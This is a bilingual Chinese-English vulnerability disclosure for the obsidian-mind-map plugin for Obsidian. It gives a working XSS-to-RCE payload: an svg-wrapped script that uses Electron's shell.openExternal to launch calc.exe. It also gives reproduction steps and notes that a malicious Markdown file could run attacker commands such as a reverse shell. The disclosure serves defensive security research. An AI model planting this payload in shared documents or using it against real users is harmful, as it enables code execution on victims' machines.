# Mind Map XSS2RCE

## 一、概述 | Ⅰ. Overview

**影响版本**：**[obsidian-mind-map](https://github.com/lynchjames/obsidian-mind-map)** 所有版本

**Affect version**: **[obsidian-mind-map](https://github.com/lynchjames/obsidian-mind-map)**   For all versions



**漏洞类型**：XSS及RCE

**Vulnerability Type**: XSS & RCE



**描述**：

**Description**:

obsidian-mind-map是Markdown笔记工具obsidian的一个插件，用于通过Markdown渲染生成思维导图，具有360,713次安装：

Obsidian-mind-map is a plugin for the Markdown note-taking tool obsidian for generating mind maps via Markdown rendering, with 360,713 installs:

![image-20231107165909462](.\images\image-20231107165909462.png)

该插件最新版本为1.1.0，对其所有版本均可通过以下svg标签实现XSS，由于obsidian使用electron开发，借由electron实现RCE：

The latest version of the plugin is 1.1.0, and for all versions, XSS is available via the following svg tag, and since obsidian is developed using electron, RCE is implemented via electron:

```js
<svg><script>try{ const {shell} = require('electron'); shell.openExternal('file:C:/Windows/System32/calc.exe') }catch(e){alert(e)}//";</script></svg>
```

## 二、复现 | Ⅱ. Reproduction

### 1、创建一个markdown文档，插入payload | 1. Create a markdown document and insert the payload

![image-20231107170641948](.\images\image-20231107170641948.png)

### 2、打开mind map渲染markdown | Open mind map to render markdown

![image-20231107170901381](.\images\image-20231107170901381.png)

![image-20231107171102749](.\images\image-20231107171102749.png)

如上图，执行`C:/Windows/System32/calc.exe`

As shown above, the execution `  C: / Windows/System32 / calc. Exe ` 

## 三、拓展利用 | Ⅲ. Vulnerability exploitation

攻击者可以通过向受害者发送含有payload的恶意Markdown，在受害者打开后，若安装了mind map插件，将导致执行攻击者命令，如反弹shell。

The attacker can do this by sending a malicious Markdown with a payload that, when opened by the victim, if the mind map plugin is installed, will result in the execution of attacker commands, such as a rebound shell.